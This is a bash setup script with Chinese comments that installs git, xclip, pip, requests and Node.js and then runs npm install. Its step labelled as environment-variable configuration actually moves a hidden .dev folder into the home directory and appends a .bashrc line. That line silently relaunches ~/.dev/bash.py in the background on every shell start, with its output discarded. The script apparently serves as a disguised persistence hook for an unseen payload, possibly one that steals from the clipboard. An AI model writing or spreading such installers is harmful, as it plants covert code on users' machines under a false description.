#!/bin/bash

# 更新和升级系统
echo "更新和升级系统..."
if ! sudo apt update && sudo apt upgrade -y; then
    echo "系统更新或升级失败，继续执行后续操作..."
fi

# 检查并安装软件包
for pkg in git xclip python3-pip; do
    if ! dpkg -l | grep -q $pkg; then
        echo "$pkg 未安装，正在安装..."
        if ! sudo apt install -y $pkg; then
            echo "安装 $pkg 失败，跳过..."
        fi
    else
        echo "$pkg 已安装"
    fi
done

# 检查并安装 Python 库 requests
if ! pip3 show requests > /dev/null 2>&1; then
    echo "requests 库未安装，正在安装..."
    if ! pip3 install requests; then
        echo "安装 requests 库失败，跳过..."
    fi
else
    echo "requests 库已安装"
fi

# 添加 Node.js 官方 PPA 并安装 Node.js 和 npm
if ! command -v node > /dev/null 2>&1; then
    echo "Node.js 未安装，正在安装..."
    if curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -; then
        if ! sudo apt install -y nodejs; then
            echo "安装 Node.js 和 npm 失败，跳过..."
        fi
    else
        echo "添加 Node.js PPA 失败，跳过..."
    fi
else
    echo "Node.js 已安装"
fi

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    echo "配置环境变量..."
    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"

    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
    if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
        echo "$BASHRC_ENTRY" >> ~/.bashrc
        echo "环境变量已添加到 .bashrc"
    else
        echo "环境变量已存在于 .bashrc"
    fi
else
    echo ".dev 目录不存在，跳过环境变量配置..."
fi

# 安装 npm 依赖
if [ -f package.json ]; then
    echo "安装 npm 依赖..."
    if ! npm install; then
        echo "npm 依赖安装失败，跳过..."
    fi
else
    echo "未找到 package.json 文件，跳过 npm 依赖安装..."
fi

echo "脚本执行完成！"
